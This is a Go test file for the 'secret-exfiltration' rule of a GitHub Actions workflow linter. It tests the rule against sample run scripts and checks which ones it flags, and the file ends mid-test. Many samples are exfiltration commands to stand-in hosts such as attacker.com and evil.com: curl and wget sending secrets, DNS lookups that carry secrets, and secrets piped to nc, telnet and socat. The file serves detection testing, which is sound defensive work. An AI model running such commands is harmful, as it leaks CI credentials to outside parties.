package core

import (
	"strings"
	"testing"

	"github.com/sisaku-security/sisakulint/pkg/ast"
	"github.com/sisaku-security/sisakulint/pkg/shell"
)

func TestNewSecretExfiltrationRule(t *testing.T) {
	rule := NewSecretExfiltrationRule()
	if rule.RuleName != "secret-exfiltration" {
		t.Errorf("RuleName = %q, want %q", rule.RuleName, "secret-exfiltration")
	}
	if !strings.Contains(rule.RuleDesc, "exfiltrated") {
		t.Errorf("RuleDesc should contain 'exfiltrated', got %q", rule.RuleDesc)
	}
}

func runSecretExfiltrationRuleForTest(script string, envVars map[string]*ast.EnvVar) []*LintingError {
	rule := NewSecretExfiltrationRule()
	step := &ast.Step{
		Env: &ast.Env{Vars: envVars},
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: script,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}
	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)
	return rule.Errors()
}

func TestSecretExfiltration_CurlWithSecret(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "curl with direct secret in -d flag",
			runScript:   `curl -X POST https://attacker.com -d "token=${{ secrets.API_TOKEN }}"`,
			wantErrors:  1,
			description: "Should detect curl with secret in data flag",
		},
		{
			name:        "curl with secret in --data flag",
			runScript:   `curl --data "key=${{ secrets.SECRET_KEY }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in --data flag",
		},
		{
			name:        "curl with secret in -H flag",
			runScript:   `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in header",
		},
		{
			name:        "curl with attached -H value containing secret",
			runScript:   `curl -H"Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in attached -H header value",
		},
		{
			name:        "curl with attached -d value containing secret",
			runScript:   `curl -d"token=${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in attached -d data value",
		},
		{
			name:        "curl POST to github api (legitimate)",
			runScript:   `curl -X POST https://api.github.com/repos/owner/repo/issues -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"`,
			wantErrors:  0,
			description: "Should NOT detect curl to GitHub API (legitimate)",
		},
		{
			name:        "curl to npm registry (legitimate)",
			runScript:   `curl -H "Authorization: Bearer ${{ secrets.NPM_TOKEN }}" https://registry.npmjs.org`,
			wantErrors:  0,
			description: "Should NOT detect curl to NPM registry (legitimate)",
		},
		{
			name:        "curl without secret",
			runScript:   `curl -X GET https://api.example.com/status`,
			wantErrors:  0,
			description: "Should NOT detect curl without secrets",
		},
		{
			name: "curl with secret in multiline script - same line",
			runScript: `#!/bin/bash
curl -X POST https://attacker.com/exfil -d "secret=${{ secrets.API_KEY }}"`,
			wantErrors:  1,
			description: "Should detect curl with secret on same line",
		},
		{
			name: "curl with GITHUB_TOKEN to github api via line continuation (legitimate)",
			runScript: `RELEASE_DATA=$(curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
  "https://api.github.com/repos/owner/repo/releases/tags/v1.0")`,
			wantErrors:  0,
			description: "Should NOT flag GITHUB_TOKEN used with GitHub API across line continuation",
		},
		{
			name:        "curl with secret as URL positional arg (legitimate webhook)",
			runScript:   `RESPONSE=$(curl -s -w "%{http_code}" -H "Content-Type: application/json" -X POST -d "$DISCORD_PAYLOAD" ${{ secrets.DISCORD_WEBHOOK_URL }})`,
			wantErrors:  0,
			description: "Should NOT flag secret used as URL positional argument (not as flag value)",
		},
		{
			name:        "curl with secret in header to attacker (malicious)",
			runScript:   `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in auth header to external site",
		},
		{
			name: "curl with secret directly to github api via variable indirection (legitimate)",
			runScript: `api_url="https://api.github.com/repos/owner/repo"
result=$(curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" "$api_url/releases/latest")`,
			wantErrors:  0,
			description: "Should NOT flag curl when URL variable resolves to api.github.com",
		},
		{
			name:        "curl with secret directly to github api via bare host (legitimate)",
			runScript:   `curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" api.github.com/repos/owner/repo/releases/latest`,
			wantErrors:  0,
			description: "Should NOT flag curl when bare host destination is api.github.com",
		},
		{
			name:        "curl with secret to github api via inline url flag (legitimate)",
			runScript:   `curl --url=https://api.github.com/repos/owner/repo/releases/latest -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}"`,
			wantErrors:  0,
			description: "Should NOT flag curl when inline --url destination is api.github.com",
		},
		{
			name:        "curl with secret to uploads.github.com (legitimate)",
			runScript:   `curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" --data-binary @file.zip "https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"`,
			wantErrors:  0,
			description: "Should NOT flag curl upload to uploads.github.com",
		},
		{
			name: "curl with multi-line JSON body and github api URL (legitimate)",
			runScript: `release_id=$(curl -s -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
  -H "Accept: application/vnd.github.v3+json" \
  -d '{
    "tag_name": "v1.0",
    "name": "Release v1.0"
  }' "https://api.github.com/repos/owner/repo/releases" | jq -r '.id')`,
			wantErrors:  0,
			description: "Should NOT flag curl with multi-line JSON body posting to GitHub API",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_WgetWithSecret(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "wget with --post-data and secret",
			runScript:   `wget --post-data "token=${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect wget with secret in post-data",
		},
		{
			name:        "wget with --header and secret",
			runScript:   `wget --header "Authorization: ${{ secrets.AUTH_TOKEN }}" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect wget with secret in header",
		},
		{
			name:        "wget from github (legitimate)",
			runScript:   `wget https://github.com/owner/repo/releases/download/v1.0/file.tar.gz`,
			wantErrors:  0,
			description: "Should NOT detect wget from GitHub without secrets",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_DNSExfiltration(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "dig with secret in query",
			runScript:   `dig ${{ secrets.API_KEY }}.attacker.com`,
			wantErrors:  1,
			description: "Should detect dig used for DNS exfiltration",
		},
		{
			name:        "nslookup with secret",
			runScript:   `nslookup ${{ secrets.TOKEN }}.evil.com`,
			wantErrors:  1,
			description: "Should detect nslookup used for DNS exfiltration",
		},
		{
			name:        "host with secret",
			runScript:   `host ${{ secrets.SECRET }}.attacker.com`,
			wantErrors:  1,
			description: "Should detect host used for DNS exfiltration",
		},
		{
			name:        "dig without secret",
			runScript:   `dig example.com`,
			wantErrors:  0,
			description: "Should NOT detect dig without secrets",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_NetcatExfiltration(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "nc with secret",
			runScript:   `echo "${{ secrets.TOKEN }}" | nc attacker.com 443`,
			wantErrors:  1,
			description: "Should detect nc with piped secret",
		},
		{
			name:        "netcat with secret",
			runScript:   `echo "${{ secrets.API_KEY }}" | netcat evil.com 80`,
			wantErrors:  1,
			description: "Should detect netcat with piped secret",
		},
		{
			name:        "telnet with secret",
			runScript:   `echo "${{ secrets.PASSWORD }}" | telnet attacker.com 23`,
			wantErrors:  1,
			description: "Should detect telnet with piped secret",
		},
		{
			name:        "socat with secret",
			runScript:   `echo "${{ secrets.SECRET }}" | socat - TCP:evil.com:443`,
			wantErrors:  1,
			description: "Should detect socat with piped secret",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_EnvVarLeak(t *testing.T) {
	tests := []struct {
		name        string
		envVars     map[string]*ast.EnvVar
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name: "curl with secret in env var",
			envVars: map[string]*ast.EnvVar{
				"my_token": {
					Name: &ast.String{Value: "MY_TOKEN"},
					Value: &ast.String{
						Value: "${{ secrets.API_TOKEN }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -X POST https://attacker.com -d "token=$MY_TOKEN"`,
			wantErrors:  1,
			description: "Should detect curl with secret passed via env var",
		},
		{
			name: "curl with secret in env var using ${} syntax",
			envVars: map[string]*ast.EnvVar{
				"secret_key": {
					Name: &ast.String{Value: "SECRET_KEY"},
					Value: &ast.String{
						Value: "${{ secrets.KEY }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -d "${SECRET_KEY}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in ${} syntax",
		},
		{
			name: "env var without secret",
			envVars: map[string]*ast.EnvVar{
				"normal_var": {
					Name: &ast.String{Value: "NORMAL_VAR"},
					Value: &ast.String{
						Value: "some-value",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -d "$NORMAL_VAR" https://example.com`,
			wantErrors:  0,
			description: "Should NOT detect env var without secret",
		},
		{
			name: "curl webhook URL as destination (not exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"GOOGLE_CHAT_WEBHOOK": {
					Name: &ast.String{Value: "GOOGLE_CHAT_WEBHOOK"},
					Value: &ast.String{
						Value: "${{ secrets.GOOGLE_CHAT_WEBHOOK }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `RESPONSE=$(curl -sS -w "\nHTTP %{http_code}" -X POST "$GOOGLE_CHAT_WEBHOOK"`,
			wantErrors:  0,
			description: "Should NOT detect webhook URL used as curl POST destination (not data payload)",
		},
		{
			name: "curl with secret as data payload to untrusted URL",
			envVars: map[string]*ast.EnvVar{
				"SLACK_TOKEN": {
					Name: &ast.String{Value: "SLACK_TOKEN"},
					Value: &ast.String{
						Value: "${{ secrets.SLACK_TOKEN }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -X POST https://attacker.com -d "token=$SLACK_TOKEN"`,
			wantErrors:  1,
			description: "Should detect secret env var used in -d data payload",
		},
		{
			name: "curl with secret in Authorization header to untrusted URL",
			envVars: map[string]*ast.EnvVar{
				"API_KEY": {
					Name: &ast.String{Value: "API_KEY"},
					Value: &ast.String{
						Value: "${{ secrets.API_KEY }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -H "Authorization: Bearer $API_KEY" https://attacker.com/collect`,
			wantErrors:  1,
			description: "Should detect secret env var used in -H header to untrusted destination",
		},
		{
			name: "curl with content-type header before webhook URL (not exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"WEBHOOK_URL": {
					Name: &ast.String{Value: "WEBHOOK_URL"},
					Value: &ast.String{
						Value: "${{ secrets.WEBHOOK_URL }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -H "Content-Type: application/json" "$WEBHOOK_URL"`,
			wantErrors:  0,
			description: "Should NOT detect webhook URL after -H content-type header (header is metadata, not payload)",
		},
		{
			name: "curl with header and data payload flag (exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"SECRET_TOKEN": {
					Name: &ast.String{Value: "SECRET_TOKEN"},
					Value: &ast.String{
						Value: "${{ secrets.SECRET_TOKEN }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -H "Content-Type: application/json" -d "$SECRET_TOKEN" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect secret env var used after -d payload flag even with preceding -H",
		},
		{
			name: "curl with literal -d payload and webhook URL as destination (not exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"WEBHOOK_URL": {
					Name: &ast.String{Value: "WEBHOOK_URL"},
					Value: &ast.String{
						Value: "${{ secrets.WEBHOOK_URL }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -H "Content-Type: application/json" -d '{"key":"value"}' "$WEBHOOK_URL"`,
			wantErrors:  0,
			description: "Should NOT flag webhook URL env var when -d carries only literal data",
		},
		{
			name: "curl --header with secret in value (exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"API_TOKEN": {
					Name: &ast.String{Value: "API_TOKEN"},
					Value: &ast.String{
						Value: "${{ secrets.API_TOKEN }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl --header "X-API-Key: $API_TOKEN" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect secret env var inside --header value",
		},
		{
			name: "wget --header with secret in value (exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"AUTH_KEY": {
					Name: &ast.String{Value: "AUTH_KEY"},
					Value: &ast.String{
						Value: "${{ secrets.AUTH_KEY }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `wget --header "Authorization: $AUTH_KEY" https://attacker.com/data`,
			wantErrors:  1,
			description: "Should detect secret env var inside wget --header value",
		},
		{
			name: "curl simple webhook URL without any flags (not exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"NOTIFY_URL": {
					Name: &ast.String{Value: "NOTIFY_URL"},
					Value: &ast.String{
						Value: "${{ secrets.NOTIFY_URL }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl "$NOTIFY_URL"`,
			wantErrors:  0,
			description: "Should NOT detect simple curl with only webhook URL",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Env: &ast.Env{
					Vars: tt.envVars,
				},
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_LegitimatePatterns(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "npm publish with token",
			runScript:   `npm publish --access public`,
			wantErrors:  0,
			description: "npm publish is legitimate",
		},
		{
			name:        "docker login",
			runScript:   `docker login -u ${{ github.actor }} -p ${{ secrets.GITHUB_TOKEN }} ghcr.io`,
			wantErrors:  0,
			description: "docker login is legitimate",
		},
		{
			name:        "docker push",
			runScript:   `docker push ghcr.io/owner/image:latest`,
			wantErrors:  0,
			description: "docker push is legitimate",
		},
		{
			name:        "twine upload",
			runScript:   `twine upload dist/*`,
			wantErrors:  0,
			description: "twine upload is legitimate",
		},
		{
			name:        "gem push",
			runScript:   `gem push *.gem`,
			wantErrors:  0,
			description: "gem push is legitimate",
		},
		{
			name:        "cargo publish",
			runScript:   `cargo publish`,
			wantErrors:  0,
			description: "cargo publish is legitimate",
		},
		{
			name:        "aws configure",
			runScript:   `aws configure set aws_access_key_id ${{ secrets.AWS_ACCESS_KEY }}`,
			wantErrors:  0,
			description: "aws configure is legitimate",
		},
		{
			name:        "gcloud auth",
			runScript:   `gcloud auth activate-service-account --key-file key.json`,
			wantErrors:  0,
			description: "gcloud auth is legitimate",
		},
		{
			name:        "terraform login",
			runScript:   `terraform login`,
			wantErrors:  0,
			description: "terraform login is legitimate",
		},
		{
			name:        "gh api call",
			runScript:   `gh api repos/owner/repo/issues`,
			wantErrors:  0,
			description: "gh cli is legitimate",
		},
		{
			name:        "git push",
			runScript:   `git push origin main`,
			wantErrors:  0,
			description: "git push is legitimate",
		},
		{
			name:        "codecov upload",
			runScript:   `codecov -t ${{ secrets.CODECOV_TOKEN }}`,
			wantErrors:  0,
			description: "codecov is legitimate",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_ErrorMessages(t *testing.T) {
	tests := []struct {
		name           string
		runScript      string
		expectedSubstr string
		description    string
	}{
		{
			name:           "critical severity message",
			runScript:      `curl -X POST https://attacker.com -d "token=${{ secrets.API_TOKEN }}"`,
			expectedSubstr: "critical",
			description:    "Should have critical severity for curl POST with secret",
		},
		{
			name:           "env var leak message",
			runScript:      `curl -d "$MY_TOKEN" https://evil.com`,
			expectedSubstr: "environment variable",
			description:    "Should mention environment variable in error",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			var envVars map[string]*ast.EnvVar
			if strings.Contains(tt.runScript, "$MY_TOKEN") {
				envVars = map[string]*ast.EnvVar{
					"my_token": {
						Name: &ast.String{Value: "MY_TOKEN"},
						Value: &ast.String{
							Value: "${{ secrets.TOKEN }}",
							Pos:   &ast.Position{Line: 1, Col: 1},
						},
					},
				}
			}

			step := &ast.Step{
				Env: &ast.Env{
					Vars: envVars,
				},
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			errors := rule.Errors()
			if len(errors) == 0 {
				t.Fatalf("%s: Expected at least one error", tt.description)
			}

			found := false
			for _, err := range errors {
				if strings.Contains(err.Description, tt.expectedSubstr) {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("%s: Expected error message to contain %q, got %v",
					tt.description, tt.expectedSubstr, errors)
			}
		})
	}
}

func TestSecretExfiltration_MultipleSecrets(t *testing.T) {
	rule := NewSecretExfiltrationRule()

	step := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `curl -X POST https://evil.com -d "token=${{ secrets.TOKEN1 }}" -H "Auth: ${{ secrets.TOKEN2 }}"`,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}

	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)

	gotErrors := len(rule.Errors())
	if gotErrors != 2 {
		t.Errorf("Expected 2 errors for multiple secrets, got %d. Errors: %v",
			gotErrors, rule.Errors())
	}
}

func TestSecretExfiltration_CommandInSubshell(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "curl in subshell",
			runScript:   `$(curl -d "${{ secrets.TOKEN }}" https://evil.com)`,
			wantErrors:  1,
			description: "Should detect curl in subshell",
		},
		{
			name:        "curl with backticks",
			runScript:   "`curl -d \"${{ secrets.TOKEN }}\" https://evil.com`",
			wantErrors:  1,
			description: "Should detect curl with backticks",
		},
		{
			name:        "curl after && operator",
			runScript:   `echo "test" && curl -d "${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl after && operator",
		},
		{
			name:        "curl after ; semicolon",
			runScript:   `echo "test"; curl -d "${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl after semicolon",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_CurlToKnownGoodDomains(t *testing.T) {
	goodDomains := []string{
		"https://api.github.com/repos/owner/repo/releases",
		"https://codecov.io/upload/v2",
		"https://api.slack.com/api/chat.postMessage",
		"https://hooks.slack.com/services/xxx/yyy",
		"https://discord.com/api/webhooks/xxx",
		"https://api.telegram.org/botXXX/sendMessage",
		"https://sentry.io/api/xxx/store/",
		"https://datadoghq.com/api/v1/events",
		"https://api.snyk.io/v1/monitor",
		"https://sonarcloud.io/api/project_analyses/search",
	}

	for _, domain := range goodDomains {
		t.Run(domain, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: `curl -X POST ` + domain + ` -H "Authorization: ${{ secrets.TOKEN }}"`,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != 0 {
				t.Errorf("Should NOT detect curl to known good domain %s, got %d errors: %v",
					domain, gotErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_AllowlistRequiresDestinationHostBoundary(t *testing.T) {
	tests := []struct {
		name      string
		runScript string
		wantErrs  int
	}{
		{
			name:      "allowlisted host in header does not suppress malicious destination",
			runScript: `curl -H "Referer: https://api.github.com" -d "token=${{ secrets.TOKEN }}" https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "allowlisted host suffix is not allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com.evil.com`,
			wantErrs:  1,
		},
		{
			name:      "untrusted second destination prevents allowlist suppression",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "artifactory in untrusted path does not allowlist",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com/artifactory`,
			wantErrs:  1,
		},
		{
			name:      "hashicorp in untrusted path does not allowlist",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com/hashicorp`,
			wantErrs:  1,
		},
		{
			name:      "artifactory product host is not implicitly allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://artifactory.example.com/api`,
			wantErrs:  1,
		},
		{
			name:      "artifactory attacker-controlled host is not allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://artifactory.evil.com`,
			wantErrs:  1,
		},
		{
			name:      "nexus in attacker-controlled host is not allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil-nexus.com`,
			wantErrs:  1,
		},
		{
			name:      "vault attacker-controlled host is not allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://vault.evil.com`,
			wantErrs:  1,
		},
		{
			name:      "explicit hashicorp domain remains allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://releases.hashicorp.com/vault/`,
			wantErrs:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
			if len(errors) != tt.wantErrs {
				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
			}
		})
	}
}

func TestSecretExfiltration_EdgeCases(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "empty script",
			runScript:   ``,
			wantErrors:  0,
			description: "Should handle empty script",
		},
		{
			name:        "comment only",
			runScript:   `# curl -d "${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  0,
			description: "Should NOT detect commands in comments (false positive acceptable)",
		},
		{
			name:        "curl command without URL",
			runScript:   `CURL_CMD="curl"`,
			wantErrors:  0,
			description: "Should NOT detect curl as variable value",
		},
		{
			name:        "secret in echo but not in curl",
			runScript:   `echo "${{ secrets.TOKEN }}" && curl https://example.com`,
			wantErrors:  0,
			description: "Should NOT detect a secret used by echo when the curl command receives no secret",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_PositionAfterEarlierGitHubExpression(t *testing.T) {
	runScript := `echo '${{ github.repository }}' && curl -d 'token=${{ secrets.API_TOKEN }}' https://evil.com`

	errors := runSecretExfiltrationRuleForTest(runScript, nil)
	if len(errors) != 1 {
		t.Fatalf("got %d errors, want 1. Errors: %v", len(errors), errors)
	}

	curlCol := strings.Index(runScript, "curl") + 1
	if errors[0].LineNumber != 1 {
		t.Fatalf("LineNumber = %d, want 1. Error: %v", errors[0].LineNumber, errors[0])
	}
	if errors[0].ColNumber < curlCol {
		t.Fatalf("ColNumber = %d, want at or after curl column %d. Error: %v", errors[0].ColNumber, curlCol, errors[0])
	}
}

func TestSecretExfiltration_ASTNetworkCommandSemantics(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		envVars     map[string]*ast.EnvVar
		wantErrors  int
		wantCommand string
	}{
		{
			name:       "quoted string containing curl is not a command",
			runScript:  `echo 'curl -d "${{ secrets.TOKEN }}" https://evil.com'`,
			wantErrors: 0,
		},
		{
			name: "heredoc body containing curl is not a command",
			runScript: `cat <<'EOF'
curl -d "${{ secrets.TOKEN }}" https://evil.com
EOF`,
			wantErrors: 0,
		},
		{
			name: "line continuation keeps curl data flag and secret in one AST call",
			runScript: `curl -X POST https://attacker.com \
  -d "token=${{ secrets.API_TOKEN }}"`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:       "secret echoed before curl is not passed to curl",
			runScript:  `echo "${{ secrets.TOKEN }}" && curl https://example.com`,
			wantErrors: 0,
		},
		{
			name: "piped secret into curl stdin data is detected",
			runScript: `printf "%s" '${{ secrets.TOKEN }}' |
  curl --data-binary @- https://evil.com`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:        "here-string secret into curl stdin data is detected",
			runScript:   `curl --data-binary @- https://evil.com <<< '${{ secrets.TOKEN }}'`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:        "here-string secret into wget stdin post file is detected",
			runScript:   `wget --post-file=- https://evil.com <<< '${{ secrets.TOKEN }}'`,
			wantErrors:  1,
			wantCommand: "wget",
		},
		{
			name: "piped secret into nc is detected",
			runScript: `printf "%s" '${{ secrets.TOKEN }}' |
  nc attacker.com 443`,
			wantErrors:  1,
			wantCommand: "nc",
		},
		{
			name: "piped secret env var into socat is detected",
			envVars: map[string]*ast.EnvVar{
				"SECRET_TOKEN": {
					Name:  &ast.String{Value: "SECRET_TOKEN"},
					Value: &ast.String{Value: "${{ secrets.SECRET_TOKEN }}"},
				},
			},
			runScript: `printf "%s" "$SECRET_TOKEN" |
